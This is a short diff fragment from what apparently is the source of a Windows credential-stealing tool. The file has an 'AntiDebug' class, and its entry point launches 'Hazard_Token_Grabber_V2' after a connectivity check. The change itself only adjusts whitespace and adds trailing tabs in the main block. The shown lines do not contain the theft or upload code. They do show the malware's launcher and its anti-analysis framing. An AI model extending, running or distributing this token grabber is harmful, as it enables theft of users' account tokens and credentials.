@@ -1134,11 +1134,9 @@ class AntiDebug(functions):
         finally:
             winreg.CloseKey(handle)
 
-
-
-if __name__ == "__main__" and os.name == "nt":
-    try:
-        httpx.get('https://google.com')
-    except httpx.ConnectTimeout:
-        os._exit(0)
+if __name__ == "__main__" and os.name == "nt":	
+    try:	
+        httpx.get('https://google.com')	
+    except httpx.ConnectTimeout:	
+        os._exit(0)	
     asyncio.run(Hazard_Token_Grabber_V2().init())
